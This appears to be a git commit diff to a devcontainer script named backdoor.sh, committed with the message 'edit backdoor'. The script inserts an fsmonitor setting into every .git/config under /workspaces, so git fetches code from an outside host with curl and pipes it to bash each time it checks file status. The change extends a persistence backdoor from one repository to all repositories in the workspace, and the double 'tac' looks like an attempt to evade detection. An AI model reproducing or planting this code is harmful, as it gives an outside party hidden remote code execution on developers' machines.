8315222cea60040ef659b85495d1b338d27607e3
JOUET Romain <contact@jouetromain.fr>
2024-04-30 14:09:40 +0200

    edit backdoor

--- .devcontainer/backdoor.sh
+++ .devcontainer/backdoor.sh
@@ -1,11 +1,12 @@
 #!/bin/bash
 
-FILE="/workspaces/test/.git/config"
 LINE_TO_ADD="\\\tfsmonitor = \"sh -c 'curl https://oof.li/ |tac|tac|bash'\""
 SECTION_START="[remote \"origin\"]"
 
-if [ -f "$FILE" ]; then
-    if ! grep -Fxq "$LINE_TO_ADD" "$FILE"; then
-        sed -i "/\[remote \"origin\"\]/i $LINE_TO_ADD" "$FILE"
+for FILE in $(find /workspaces -type f -wholename "*.git/config"); do
+    if [ -f "$FILE" ]; then
+        if ! grep -Fxq "$LINE_TO_ADD" "$FILE"; then
+            sed -i "/\[remote \"origin\"\]/i $LINE_TO_ADD" "$FILE"
+        fi
     fi
-fi
+done
